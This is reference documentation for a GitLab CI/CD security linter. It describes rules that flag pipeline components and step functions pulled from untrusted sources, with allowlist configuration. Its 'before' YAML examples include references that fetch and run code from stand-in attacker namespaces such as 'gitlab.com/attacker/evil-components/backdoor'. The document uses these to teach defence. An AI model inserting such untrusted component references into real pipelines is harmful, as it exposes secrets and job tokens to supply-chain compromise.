# GitLab CI/CD rule catalog

Reference for rules Plumber runs against GitLab CI/CD pipelines. Each
entry gives the trigger, the risk, and a compilable **before / after**
remediation so you can drop the fix in without reading the upstream
docs. This catalog is seeded incrementally as rules are documented;
absence from this file does not mean a rule doesn't exist — see
[`control/codes.go`](../control/codes.go) for the full list.

## Table of contents

### Pipeline composition — `4xx`

| Code | Name | Severity |
| :--- | :--- | :--- |
| [ISSUE-414](#issue-414--component-authorized-sources) | `component-authorized-sources` | high |
| [ISSUE-415](#issue-415--function-authorized-sources) | `function-authorized-sources` | high |

### Run / output conventions

- Every finding prints a clickable `↳ at <file>:<line>` — `Ctrl+click`
  in a VS Code terminal opens the exact job.
- Severity counts drive the **Plumber score** (A–E).
- To turn a rule off, either disable its `ControlName` in
  `.plumber.yaml` or pass `--skip-controls <control-name>`. The
  mapping lives in [`control/codes.go`](../control/codes.go).

---

## ISSUE-414 — `component-authorized-sources`

**Severity:** `high` • **Control:** `componentMustComeFromAuthorizedSources`

An `include: component:` reference is pulled from a source that isn't
trusted. Components run arbitrary code with the job's full context
(variables, secrets, `CI_JOB_TOKEN`) — the GitLab analogue of a
GitHub Actions "pwn request" — so an unvetted source is a direct
supply-chain entry point.

A source is **trusted** when any of these hold:

- it matches an explicit `trustedComponents` allowlist pattern
  (wildcards supported, `$VAR`/`${VAR}` notation both accepted);
- `trustSameGroupComponents` (default `true`) and the component lives
  under the scanned project's own root namespace, on the same GitLab
  instance;
- `trustSameInstanceComponents` (default `true`) and the component is
  hosted on the scanned instance at all, regardless of namespace — a
  self-hosted instance is already inside the org's trust boundary the
  way gitlab.com, a multi-tenant SaaS host, is not. **This option is
  ignored on gitlab.com**: Plumber always turns it off there, even when
  `.plumber.yaml` sets it to `true`. Use `trustedComponents` or
  `trustGitlabOfficialComponents` to trust sources on gitlab.com.
- `trustGitlabOfficialComponents` (default `true`) and the component
  lives in one of GitLab's own curated namespaces on gitlab.com:
  `gitlab.com/components/*` or `gitlab.com/gitlab-org/*`. Only the
  literal `gitlab.com` host matches; a same-named namespace on a
  self-hosted instance is not covered.

```yaml
# ❌ before — component from an untrusted external namespace
include:
  - component: gitlab.com/attacker/evil-components/backdoor@1.0.0

build:
  script:
    - echo build
```

```yaml
# ✅ after — trusted: lives under the project's own namespace
include:
  - component: $CI_SERVER_FQDN/$CI_PROJECT_PATH/secret-detection@1.0.0

build:
  script:
    - echo build
```

**Config.**

```yaml
componentMustComeFromAuthorizedSources:
  enabled: true
  # Trust components under this project's own root namespace
  trustSameGroupComponents: true
  # Trust any component on the same GitLab instance, regardless of
  # namespace. Ignored on gitlab.com, where it is always off.
  trustSameInstanceComponents: true
  # Trust GitLab's official components on gitlab.com:
  # gitlab.com/components/* and gitlab.com/gitlab-org/*
  trustGitlabOfficialComponents: true
  # Additional trusted component source URLs and patterns (wildcards supported)
  trustedComponents: []
```

---

## ISSUE-415 — `function-authorized-sources`

**Severity:** `high` • **Control:** `functionMustComeFromAuthorizedSources`

A `run:` step function reference (`func:`, or the deprecated `step:`
alias) is pulled from a source that isn't trusted. Functions
(docs.gitlab.com/ci/functions) run arbitrary code with the job's full
context — the same supply-chain exposure as CI/CD components above.
Trust is evaluated identically regardless of which key form is used;
a deprecated reference form (`step:` instead of `func:`, or a
deprecated git-repository ref) is tracked separately as a terminal
stat, not as a violation of this rule.

A reference is **trusted** when any of these hold:

- it matches an explicit `trustedFunctions` allowlist pattern
  (wildcards supported, `$VAR`/`${VAR}` notation both accepted);
- `trustSameGroupFunctions` (default `true`) and the function is
  hosted on the scanned GitLab instance, under the project's own
  root namespace. "Hosted on the instance" means its web host (git
  form) or its container registry host (OCI form). The registry host
  is the one the GitLab API reports for the project, never a CI/CD
  variable such as `CI_TEMPLATE_REGISTRY_HOST`, which the pipeline
  can redefine.

The structured form (`func: {git: {url, rev, dir, file}}`) is checked
like the equivalent `url/-/dir/file@rev` string. A `func:` value
Plumber cannot read is reported as untrusted, never skipped.

Local (relative/absolute filesystem path) function references are
same-repo and always out of scope.

```yaml
# ❌ before — function from an untrusted external namespace
build:
  run:
    - name: say_hi
      func: registry.gitlab.com/attacker/evil/backdoor:1
```

```yaml
# ✅ after — trusted: lives under the project's own namespace
build:
  run:
    - name: say_hi
      func: $CI_TEMPLATE_REGISTRY_HOST/$CI_PROJECT_PATH/echo:1
      inputs:
        message: "Hi Sally!"
```

**Config.**

```yaml
functionMustComeFromAuthorizedSources:
  enabled: true
  # Trust functions under this project's own root namespace
  trustSameGroupFunctions: true
  # Additional trusted function source URLs and patterns (wildcards
  # supported). Both $VAR and ${VAR} notation are listed below since
  # pipeline authors write either form.
  trustedFunctions:
    - $CI_TEMPLATE_REGISTRY_HOST/$CI_PROJECT_PATH/*
    - ${CI_TEMPLATE_REGISTRY_HOST}/${CI_PROJECT_PATH}/*
```
